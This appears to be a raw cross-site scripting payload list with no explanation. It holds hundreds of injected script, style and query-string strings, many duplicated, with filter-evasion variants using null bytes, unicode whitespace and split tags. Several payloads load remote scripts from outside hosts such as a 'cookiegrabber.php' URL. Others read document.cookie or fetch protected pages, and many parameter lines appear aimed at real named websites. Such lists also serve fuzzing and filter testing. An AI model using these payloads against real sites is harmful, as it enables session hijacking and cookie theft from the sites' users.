<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC=HTTP://LINKTOJS/></SCRIPT> // Cross Browser
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
<SCRIPT SRC="http://vulnerability-lab.com/CrossSiteScripting.jpg"></SCRIPT>
<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js?<B>
<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>
<script src="http://www.evilsite.org/cookiegrabber.php"></script>
<script>  src="http://www.site.com/XSS.js"></script>
'>"><script src = 'http://www.site.com/XSS.js'></script>
<script src=http://yoursite.com/your_files.js></script>
<script src="javascript:alert(1)">
<script src="javascript:alert(1)">
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<SCRIPT SRC=%(jscript)s?<B>
<SCRIPT SRC=%(jscript)s?<B>
<script src="/\%(jscript)s"></script>
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<script src=%(jscript)s></script>
<script src=%(jscript)s></script>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<SCRIPT SRC=//vulnerability-lab.com/.js>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script>top['alert'](3)</script>
<script type=text/vbscript>msgbox document.location</script> // IE 10
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074`1`</script> // ES6 Variation
<script>\u0061\u006C\u0065\u0072\u0074(1)</script> // Unicode escapes
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script> // ES6 Variation
<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
<script>var junk = '</script><script>alert(1)</script>';</script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click'; document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>var var = 1; alert(var)</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22); xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{ var c; if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) ) alert(c[1]); }catch(e){} }; xdr.send(); </script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
<script>window['alert'](0)</script>
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
<script\x00>alert(1)</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<script\x00>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0A>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x0D>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x20>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x20type="text/javascript">javascript:alert(1);</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x2A/javascript:alert(1)// */</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
<script\x2F>javascript:alert(1)</script>
<script\x2F>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x3Bjavascript:alert(1)</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
<script x> alert(1) </script 1=2
<script x> alert(1) </script 1=2
<script x> alert(1) </script 1=2
<script x> alert(1) </script 1=2
<script x> alert(1) </script 1=2
<script x> alert(1) </script 1=2
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<scr<script>ipt>alert(1)</scr<script>ipt>
<scrscriptipt>alert(1)</scrscriptipt>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
<scr<script>ipt>alert('XSS');</scr</script>ipt>
&sDNSLookup=ANY&fDNSLookup=davealger.info
&search=1%22+onmouseover=alert%28String.fromCharCode%2877,111,117,115,101,79,118,101,114,32,87,105,110,33%29%29+&mode=anywords&submit=Go
&search=%22%2F%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E
&search='';!--%22%3Cscript%3Ealert('Hello%20Reddit')%3C/script%3E&category=artisttitle
&search=%22%3E%3Cscript%3Ealert(0);%3C/script%3E&button=GO
&Search=%22%3E%3Cscript%3Ealert%28%27XSSPOSED%27%29%3C/script%3E%3Cspan%20id=%22&Action=search&id=24093%3Bccom&Submit.x=10&Submit.y=5&Submit=Search
&search=%22%3E%3Cscript%3Ealert%28/XSS/.source%29%3C/script%3E
&search=%27%22%3Cmarquee%3E%3Cimg+src=x+onerror=confirm%28/XSSPOSED/%29%3E
&search=%3Cbody%20onload=alert(%22XSS%22)%3E
&search=%3Cdiv+style%3D%22width%3A100%25%3Bheight%3A100%25%3Bposition%3Aabsolute%3Btop%3A0%3Bleft%3A0%22+onmouseover%3D%22alert%280%29%3B%22%3E%3C%2Fdiv%3E
&search=%3Ciframe%20src='http://reddit.com/r/xss'%20width='500'%20height='600'%3E%3C/iframe%3E
&search=%3Cimg%20src=http://hacktalk.net/pwnt.png%20/%3E
&search=%3Cobject+width%3D%22425%22+height%3D%22344%22%3E%3Cparam+name%3D%22movie%22+value%3D%22http://www.youtube.com/v/0Bmhjf0rKe8%26color1%3D0xb1b1b1%26color2%3D0xcfcfcf%26hl%3Dnl_NL%26feature%3Dplayer_embedded%26fs%3D1%22%3E%3C/param%3E%3Cparam+name%3D%22allowFullScreen%22+value%3D%22true%22%3E%3C/param%3E%3Cparam+name%3D%22allowScriptAccess%22+value%3D%22always%22%3E%3C/param%3E%3Cembed+src%3D%22http://www.youtube.com/v/0Bmhjf0rKe8%26color1%3D0xb1b1b1%26color2%3D0xcfcfcf%26hl%3Dnl_NL%26feature%3Dplayer_embedded%26fs%3D1%26autoplay%3D1%22+type%3D%22application/x-shockwave-flash%22+allowfullscreen%3D%22true%22+allowScriptAccess%3D%22always%22+width%3D%22425%22+height%3D%22344%22%3E%3C/embed%3E%3C/object%3E&submit.x=0&submit.y=0
&search=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
&search=%3CSCRIPT/SRC%3D%22http://ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E&st=0&submit=Search
&Search=abc123<%2Ftitle><script>alert('1')<%2Fscript>&Option=All&Find=Find
&search=ads%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&ci=1
&search=<body onload=alert%28%22XSS%22%29>&x=0&y=0
&searchfor=%22/%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cdiv%20%22&incWriters=&incPublishers=&incArtists=&incAltTitles=&TypeOfSearch=title
&SearchID=3125843&SearchRefineID=6695888&KeyWord=l%22%3E%3Cscript%20src=%22http://www.yourjavascript.com/38310202111/xss.js%22%20/%3E
&searchInput=%22;%20window.onload=function(){alert(0);}//
&searchinput=alert(0);</script>">'><script>alert(0);</script>
&searchitems='"/><script>alert%28String.fromCharCode%2888,83,83%29%29</script>&search=Search
&search_keywords=zo%3Cbody%20onload=alert(%22XSS%22)%3E
&searchPhrase=super%20hijack%20fun%20time+%3Ci%3E%3Cobject%20data=%22http://www.mustardlab.com/developer/fun/flashbomb.swf%22%20type=%22application/x-shockwave-flash%22%3E%3Cparam%20name=%22movie%22%20value=%22http://www.mustardlab.com/developer/fun/flashbomb.swf%22%20/%3E%3Cparam%20name=%22allowScriptAccess%22%20value=%22always%22%20/%3E%3Cparam%20name=%22FlashVars%22%20value=%22swfsrc=http://www.mustardlab.com/developer/fun/dance.swf%22%20/%3E%3C/object%3E%3C/i%3E&listViewSize=&indexStart=0&sortBy=&sortOrder=&categories=&skucolor=&priceLow=&priceHigh=&skusize=&brand=
&search="><script>alert('0');</script>
&search=<script>alert(document.cookie)</script>
&search=<script>alert(document.cookie)</script>
&search="><script>alert(String.fromCharCode(88,83,83))</script>
&search="><script>alert('XSS')</script>
&search="><script type="text/javascript">alert("Hello Dave");</script>
&search=simple&queryText=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=%22&collection=us
&search=site&searchbutton=Go&keywords=%22%3E%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
&search_string=%22%3E%3Cscript/xss%3Ealert%28/XSSPOSED/%29%3C/script/xss%3E
&searchString=%22;alert%28%27XSS%27%29;//&searchSubmit=
&searchstring=%22onfocus=%22alert(document.cookie)%22autofocus=%22&searchtype=allproducts&searchsource=0
&searchstring=%22onmouseover=%22alert%28%27XSS%27%29
&searchString=asd%22%3E%3Cscript+src%3D%22http%3A%2F%2Fwww.yourjavascript.com%2F38310202111%2Fxss.js%22%3E&ctry=us&button=Go
&search_tag=hoi%22%3E%3Cbody%20onload=alert%28%22XSS%22%29%3E
&search_term=%22%3E%3Cimg%20src%3Dhttp://i.imgur.com/KYRF0.jpg%20height%3D600%20width%3D450%3E
&SearchTerm=%27+%0A%09%09%09%09%09%09};+%0A%09%09%09%09%09%09alert%280%29;+%0A%09%09%09%09%09%09a%20=%20{+%0A%09%09%09%09%09%09%09%27a%27+:+%27
&searchterm=%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E
&searchterm=%3CsVg%2FOnLOaD%3Dprompt%28%2FXSSPOSED%2F%29%3E&searchpath=%2Fcontent%2Fngaweb%2Fglobal-site-search-page&pageNumber=1
&searchTerm=';alert(document.cookie);}//&search=
&SearchTerm=awdawdawdawd%22,%22%22,%22%22,%22%22);alert(%22Reddit%20rulez!!!%22);//
&searchTerm="><svg onload='a=alert;a("XSSPOSED")'><"&defaultSearch=None&search=
&SearchText=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22
&searchText=%22---%3Cscript%3Ealert(%22Hello%20Reddit%22);%3C/script%3E&imprint=000&region=9&searchType=As&searchBy=subTitle&search_dropdown=0
&search_text=%22;alert%28%22XSS%22%29;//&sort=date&x=0&y=0
&searchtext=%3Cscript%3Ealert%280%29%3C%2Fscript%3E&x=0&y=0
&searchtext=%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E&action=search
&searchType=0&service=BRN&serviceType=BRN&partner=&ZIP=60510&street="><script>alert('XSS')</script>
&searchType=global&N=0&Ntt=;!--"<iframe src='http://reddit.com/r/xss' width='1024' height='600'></iframe>
&Search=xss"><script+src="http://www.yourjavascript.com/38310202111/xss.js">
<select autofocus onfocus=alert(1)>
'></select><script>alert(123)</script>
set system contact <script>alert('VL')</script>
set system location "><iframe src=a onload=alert("VL") <
set system name <iframe src=http://www.vulnerability-lab.com>
setTimeout// (name// ,0)
set vlan name 1337 <script>alert(document.cookie)</script>
&show=24&brand=a"/><svg/onload="a=alert;a('XSS')
&ShowForm=no&query=&lg=%3E%22%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E
&sid=&p=&q=%27*alert%28%27XSS%27%29*%27
&sitearea=o2shop&query=%22%3Cscript%3Ealert(0)%3C/script%3E
&siteId="<img src="http://thumbs.reddit.com/t5_2qxe8.png
&site=NYUWeb_Main&client=its_new_frontend&output=xml_no_dtd&proxystylesheet=its_new_frontend&proxyreload=1&sitesearch=www.nyu.edu/its&q=%22/%3E%3Cbody+onload%3Dalert%28%22XSS%22%29%3E&submit.x=0&submit.y=0
&site=stern_collection&client=stern_frontend&output=xml_no_dtd&proxystylesheet=stern_frontend&q=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22&x=9&y=4
&site=wnews&client=wnews&output=xml_no_dtd&ie=UTF-8&oe=UTF-8&filter=p&getfields=wnnis&sort=date:D:S:d1&lr=-lang_ja&proxystylesheet=wnews&partialfields=-wnnis:NOAVSYND&q=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F\\%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28S
&site=www.aegonbank.nl&mediasurface_target=/%3Fview%3DSearch%2Bresults&view=Search+results&freesearch=%3Cbody%20onload=alert%28%22XSS%22%29%3E
&sku=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&shopid=100001&_requestid=426505
&sl='"--></style></script><script>alert(document.cookie)</script>
&smartapi!celexapi!prod!CELEXnumdoc&lg=en&numdoc=21994A0103%2801%29&model=guichett%22%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E%27%22%3E
&s=m"><script>alert('xss')</script>
&sortBy=mngi&similarTo=&similarType=find&type=any&aff=3&view=entiresitesppublished&query=PsychoMantis%27/confirm(/xssposed/)/%27
&&sort="><script>alert('XSS')</script>
&source=20121104_final_push_video#!/
&source="><script>alert(String.fromCharCode(88,83,83))</script>
&spage=%27;alert%28/XSSPOSED%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//&q=%27;alert%280%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//
<SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
&SQ=%22xss+protection%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E%22&act=RSR&searchAID=&forumID=8
SRC
&src=%22%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E
&src=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
src="http://www.site.com/XSS.js"></script>
&src=/images/diagrams/webmarshal_large.gif&w="><script>alert('XSS')</script>
&ss=1&p=1&country=ve&producto="><script>alert(String.fromCharCode(88,83,83))</script>
&s="><script>alert(String.fromCharCode(88,83,83))</script>
&&s=site:reddit.com&fltdigg=%27;alert%28document.cookie%29;a=%27
 sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
&start=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E
&start=41&perpage=10&col=ndguard&summary="'/><script>alert(String.fromCharCode(88,83,83))</script>
&start="><script>alert(String.fromCharCode(88,83,83))</script>
&status=XSS%2Bhttp%253A%252F%252F%27%26alert%28%22XSS%22%29%26%27
&s=test%22%3E%3Cscript%3Ealert%281%29%3C/script%3Ehello&lang=en
&s=test%22%3E%3Cscript%3Ealert%281%29%3C/script%3Ehello&lang=en
&storeId=10151&langId=-1&catalogId=10051&N=0&newSearch=true&Ntt=%22%3Ciframe%20src=%22http://reddit.com/r/xss%22%20width=%22800%22%20height=%22600%22
&storeId=10701%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E&catalogId=10051
&s=t&q=%27;alert%28/XSSPOSED%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//&q=%27;alert%280%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//l=dir&qsrc=2891&o=10300
&str="><script>alert(String.fromCharCode(88,83,83))</script>
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<style>body:after{content: “\61\6c\65\72\74\28\31\29″}</style><script>eval(eval(document.styleSheets[0].cssRules[0].style.content))</script>
<style>body{background-color:expression\(alert(1))}</style>
<style>body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }</style>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://vulnerability-lab.com/CrossSiteScriptingmoz.xml#CrossSiteScripting")}</STYLE>
 style=color: expression(alert(0));" a="
<STYLE>.CrossSiteScripting{background-image:url("javascript:alert('CrossSiteScripting')");}</STYLE><A CLASS=CrossSiteScripting></A>
<STYLE>.CrossSiteScripting{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=CrossSiteScripting></A>
>"<STYLE>.CrossSiteScripting{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=CrossSiteScripting></A>
<style><img src="</style><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>@import'%(css)s';</STYLE>
<STYLE>@import'%(css)s';</STYLE>
<STYLE>@import'%(css)s';</STYLE>
<style>*[{}@import'%(css)s?]</style>X
<style>*[{}@import'%(css)s?]</style>X
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>@import'http://vulnerability-lab.com/CrossSiteScripting.css';</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScripting")';</STYLE>
<style>@import'javascript:alert("XSS")';</style>
